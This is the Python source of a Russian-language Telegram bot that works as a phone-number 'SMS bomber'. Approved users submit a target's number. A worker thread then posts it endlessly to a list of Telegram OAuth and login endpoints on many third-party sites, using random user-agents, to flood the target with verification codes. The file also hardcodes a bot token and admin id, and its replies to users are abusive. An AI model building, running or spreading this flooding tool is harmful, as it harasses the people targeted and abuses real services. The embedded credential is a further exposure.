import telebot
import requests
from fake_useragent import UserAgent
import threading
import sqlite3
import logging
from contextlib import closing
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Optional

bot = telebot.TeleBot("8788404662:AAHQDvLsRhkXdFNfz_d2rzYHvlKHIed0tjQ")
admin_id = 8471847665

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=1878948291&origin=https%3A%2F%2Fwww.cryptobot.com&embed=1&return_to=https%3A%2F%2Fwww.cryptobot.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1573573111&origin=https%3A%2F%2Fcoinmarketcap.com&embed=1&return_to=https%3A%2F%2Fcoinmarketcap.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1234567890&origin=https%3A%2F%2Fexample.com&embed=1&return_to=https%3A%2F%2Fexample.com',
    'https://oauth.telegram.org/auth/request?bot_id=987654321&origin=https%3A%2F%2Ftest.com&embed=1&return_to=https%3A%2F%2Ftest.com',
    'https://oauth.telegram.org/auth/request?bot_id=1111111111&origin=https%3A%2F%2Fsite.ru&embed=1&return_to=https%3A%2F%2Fsite.ru',
    'https://oauth.telegram.org/auth/request?bot_id=222222222&origin=https%3A%2F%2Fservice.com&embed=1&return_to=https%3A%2F%2Fservice.com'
]

active = {}
db_path = "tickets.db"
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot_paused = False

class TicketStatus(str, Enum):
    NEW = "new"
    ACCEPTED = "accepted"
    REJECTED = "rejected"

@dataclass
class Ticket:
    id: int
    user_id: int
    username: str
    phone: str
    status: str
    created_at: str

def get_conn():
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with closing(get_conn()) as conn:
        conn.execute("""
            create table if not exists tickets (
                id integer primary key autoincrement,
                user_id integer not null,
                username text,
                phone text,
                status text not null default 'new',
                created_at text not null
            )
        """)
        conn.commit()

def create_ticket(user_id: int, username: str, phone: str = "", status: str = TicketStatus.NEW.value) -> Ticket:
    with closing(get_conn()) as conn:
        cur = conn.execute(
            "insert into tickets (user_id, username, phone, status, created_at) values (?, ?, ?, ?, ?)",
            (user_id, username, phone, status, datetime.now().isoformat(timespec="seconds"))
        )
        conn.commit()
        ticket_id = cur.lastrowid
        row = conn.execute("select * from tickets where id = ?", (ticket_id,)).fetchone()
        return Ticket(
            id=row["id"],
            user_id=row["user_id"],
            username=row["username"],
            phone=row["phone"],
            status=row["status"],
            created_at=row["created_at"]
        )

def get_ticket(ticket_id: int) -> Optional[Ticket]:
    with closing(get_conn()) as conn:
        row = conn.execute("select * from tickets where id = ?", (ticket_id,)).fetchone()
        if not row:
            return None
        return Ticket(
            id=row["id"],
            user_id=row["user_id"],
            username=row["username"],
            phone=row["phone"],
            status=row["status"],
            created_at=row["created_at"]
        )

def get_last_ticket_by_user(user_id: int) -> Optional[Ticket]:
    with closing(get_conn()) as conn:
        row = conn.execute("select * from tickets where user_id = ? order by id desc limit 1", (user_id,)).fetchone()
        if not row:
            return None
        return Ticket(
            id=row["id"],
            user_id=row["user_id"],
            username=row["username"],
            phone=row["phone"],
            status=row["status"],
            created_at=row["created_at"]
        )

def update_ticket_status(ticket_id: int, status: TicketStatus):
    with closing(get_conn()) as conn:
        conn.execute("update tickets set status = ? where id = ?", (status.value, ticket_id))
        conn.commit()

def update_ticket_phone(ticket_id: int, phone: str):
    with closing(get_conn()) as conn:
        conn.execute("update tickets set phone = ? where id = ?", (phone, ticket_id))
        conn.commit()

def list_all_tickets() -> list[Ticket]:
    with closing(get_conn()) as conn:
        rows = conn.execute("select * from tickets order by id desc").fetchall()
        return [
            Ticket(
                id=r["id"],
                user_id=r["user_id"],
                username=r["username"],
                phone=r["phone"],
                status=r["status"],
                created_at=r["created_at"]
            ) for r in rows
        ]

def list_active_users() -> list[Ticket]:
    with closing(get_conn()) as conn:
        rows = conn.execute("select * from tickets where status in ('new','accepted') order by id desc").fetchall()
        return [
            Ticket(
                id=r["id"],
                user_id=r["user_id"],
                username=r["username"],
                phone=r["phone"],
                status=r["status"],
                created_at=r["created_at"]
            ) for r in rows
        ]

def clear_db():
    with closing(get_conn()) as conn:
        conn.execute("delete from tickets")
        conn.commit()

def get_all_accepted_users() -> list[int]:
    with closing(get_conn()) as conn:
        rows = conn.execute("select user_id from tickets where status = 'accepted' group by user_id").fetchall()
        return [r["user_id"] for r in rows]

def format_ticket(t: Ticket) -> str:
    return (f"заявка #{t.id}\n"
            f"юзер: @{t.username} (id {t.user_id})\n"
            f"номер: {t.phone if t.phone else 'не указан'}\n"
            f"статус: {t.status}")

def ticket_keyboard(ticket_id: int):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("принять", callback_data=f"accept:{ticket_id}"),
        telebot.types.InlineKeyboardButton("отклонить", callback_data=f"reject:{ticket_id}")
    )
    return markup

def admin_menu():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(telebot.types.InlineKeyboardButton("добавить пользователя", callback_data="admin_add_user"))
    markup.row(telebot.types.InlineKeyboardButton("заблокировать пользователя", callback_data="admin_block_user"))
    markup.row(telebot.types.InlineKeyboardButton("очистить базу данных", callback_data="admin_clear_db"))
    if bot_paused:
        markup.row(telebot.types.InlineKeyboardButton("включить бота", callback_data="admin_resume"))
    else:
        markup.row(telebot.types.InlineKeyboardButton("временно остановить бота", callback_data="admin_pause"))
    return markup

def check_paused(message):
    if bot_paused and message.from_user.id != admin_id:
        bot.reply_to(message, "бот на тех работах")
        return True
    return False

@bot.message_handler(commands=['start'])
def start(m):
    if check_paused(m):
        return
    user = m.from_user
    if user.id == admin_id:
        bot.reply_to(m, "ты админ кидай номер")
        return
    last = get_last_ticket_by_user(user.id)
    if last:
        if last.status == TicketStatus.ACCEPTED.value:
            bot.reply_to(m, "ты принят даун отправь номер")
            return
        elif last.status == TicketStatus.NEW.value:
            bot.reply_to(m, "заявка уже на рассмотрении")
            return
        else:
            bot.reply_to(m, "ты отклонён иди нахуй")
            return
    t = create_ticket(user.id, user.username or "", "")
    bot.reply_to(m, "заявка отправлена админу")
    bot.send_message(admin_id, format_ticket(t), reply_markup=ticket_keyboard(t.id))

@bot.message_handler(commands=['stop'])
def stop(m):
    if check_paused(m):
        return
    if m.chat.id in active:
        active[m.chat.id]['stop'] = True
        bot.reply_to(m, "остановлено")
    else:
        bot.reply_to(m, "нет спама")

@bot.message_handler(commands=['admin'])
def admin_cmd(m):
    if m.from_user.id != admin_id:
        bot.reply_to(m, "только админ")
        return
    bot.reply_to(m, "админка", reply_markup=admin_menu())

@bot.message_handler(commands=['tickets'])
def tickets_cmd(m):
    if check_paused(m):
        return
    if m.from_user.id != admin_id:
        bot.reply_to(m, "только админ")
        return
    tickets = list_all_tickets()
    if not tickets:
        bot.reply_to(m, "заявок нет")
        return
    for t in tickets:
        markup = ticket_keyboard(t.id) if t.status == TicketStatus.NEW.value else None
        bot.send_message(m.chat.id, format_ticket(t), reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    global bot_paused
    if call.from_user.id != admin_id:
        bot.answer_callback_query(call.id, "только админ", show_alert=True)
        return

    data = call.data

    if data.startswith("accept:") or data.startswith("reject:"):
        action, ticket_id_str = data.split(":")
        ticket_id = int(ticket_id_str)
        t = get_ticket(ticket_id)
        if not t:
            bot.answer_callback_query(call.id, "заявка не найдена", show_alert=True)
            return
        if t.status != TicketStatus.NEW.value:
            bot.answer_callback_query(call.id, f"уже обработана: {t.status}", show_alert=True)
            return
        if action == "accept":
            update_ticket_status(ticket_id, TicketStatus.ACCEPTED)
            user_msg = "ты принят даун отправь номер"
            admin_msg = f"заявка #{ticket_id} принята"
        else:
            update_ticket_status(ticket_id, TicketStatus.REJECTED)
            user_msg = "иди нахуй"
            admin_msg = f"заявка #{ticket_id} отклонена"
        try:
            bot.send_message(t.user_id, user_msg)
        except Exception as e:
            logger.warning(f"не отправить юзеру {t.user_id}: {e}")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_id, admin_msg)
        bot.answer_callback_query(call.id, "готово")
        return

    if data == "admin_add_user":
        msg = bot.send_message(call.message.chat.id, "введи юзернейм или айди")
        bot.register_next_step_handler(msg, add_user_step)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_block_user":
        users = list_active_users()
        if not users:
            bot.send_message(call.message.chat.id, "нет активных пользователей")
            bot.answer_callback_query(call.id)
            return
        for u in users:
            markup = telebot.types.InlineKeyboardMarkup()
            markup.row(telebot.types.InlineKeyboardButton("заблокировать", callback_data=f"block:{u.user_id}"))
            bot.send_message(call.message.chat.id,
                             f"id: {u.user_id}, username: @{u.username}, статус: {u.status}",
                             reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data.startswith("block:"):
        user_id = int(data.split(":")[1])
        last = get_last_ticket_by_user(user_id)
        if not last:
            bot.answer_callback_query(call.id, "пользователь не найден", show_alert=True)
            return
        if last.status == TicketStatus.REJECTED.value:
            bot.answer_callback_query(call.id, "уже заблокирован", show_alert=True)
            return
        update_ticket_status(last.id, TicketStatus.REJECTED)
        try:
            bot.send_message(user_id, "ты заблокирован иди нахуй")
        except:
            pass
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(admin_id, f"пользователь {user_id} заблокирован")
        bot.answer_callback_query(call.id, "заблокирован")
        return

    if data == "admin_clear_db":
        clear_db()
        bot.send_message(call.message.chat.id, "база очищена")
        bot.answer_callback_query(call.id)
        return

    if data == "admin_pause":
        bot_paused = True
        bot.send_message(call.message.chat.id, "бот остановлен", reply_markup=admin_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "admin_resume":
        bot_paused = False
        bot.send_message(call.message.chat.id, "бот включён", reply_markup=admin_menu())
        accepted = get_all_accepted_users()
        for uid in accepted:
            try:
                bot.send_message(uid, "тех работы окончены можете пользоваться ботом")
            except:
                pass
        bot.answer_callback_query(call.id)
        return

def add_user_step(m):
    if m.from_user.id != admin_id:
        return
    text = m.text.strip()
    if text.isdigit():
        user_id = int(text)
        username = ""
    else:
        if text.startswith("@"):
            text = text[1:]
        username = text
        with closing(get_conn()) as conn:
            row = conn.execute("select user_id from tickets where username = ? limit 1", (username,)).fetchone()
            if row:
                user_id = row["user_id"]
            else:
                bot.reply_to(m, "не могу определить айди введи числовой айди")
                return
    last = get_last_ticket_by_user(user_id)
    if last:
        if last.status == TicketStatus.REJECTED.value:
            update_ticket_status(last.id, TicketStatus.ACCEPTED)
            bot.reply_to(m, f"пользователь {user_id} восстановлен")
            try:
                bot.send_message(user_id, "ты принят даун отправь номер")
            except:
                pass
        else:
            if last.status != TicketStatus.ACCEPTED.value:
                update_ticket_status(last.id, TicketStatus.ACCEPTED)
                bot.reply_to(m, f"пользователь {user_id} обновлён")
                try:
                    bot.send_message(user_id, "ты принят даун отправь номер")
                except:
                    pass
            else:
                bot.reply_to(m, f"пользователь {user_id} уже принят")
    else:
        create_ticket(user_id, username or "", "", TicketStatus.ACCEPTED.value)
        bot.reply_to(m, f"пользователь {user_id} добавлен")
        try:
            bot.send_message(user_id, "ты принят даун отправь номер")
        except:
            pass

@bot.message_handler(func=lambda m: True)
def handle(m):
    if check_paused(m):
        return
    if m.from_user.id == admin_id:
        pass
    else:
        last = get_last_ticket_by_user(m.from_user.id)
        if not last or last.status != TicketStatus.ACCEPTED.value:
            bot.reply_to(m, "ваша заявка не принята напишите /start")
            return
    phone = ''.join(filter(str.isdigit, m.text.strip()))
    if len(phone) < 10:
        bot.reply_to(m, "не номер")
        return
    if m.chat.id in active:
        bot.reply_to(m, "уже спамим")
        return
    if m.from_user.id != admin_id:
        last = get_last_ticket_by_user(m.from_user.id)
        if last:
            update_ticket_phone(last.id, phone)
    bot.reply_to(m, "спамлю")
    def worker(chat_id, phone):
        ua = UserAgent()
        active[chat_id] = {'stop': False}
        try:
            while not active[chat_id]['stop']:
                for ep in endpoints:
                    if active[chat_id]['stop']:
                        break
                    try:
                        headers = {'user-agent': ua.random}
                        data = {'phone': phone}
                        requests.post(ep, headers=headers, data=data, timeout=10)
                    except:
                        pass
        finally:
            if chat_id in active:
                del active[chat_id]
    threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()

if __name__ == '__main__':
    init_db()
    bot.infinity_polling()
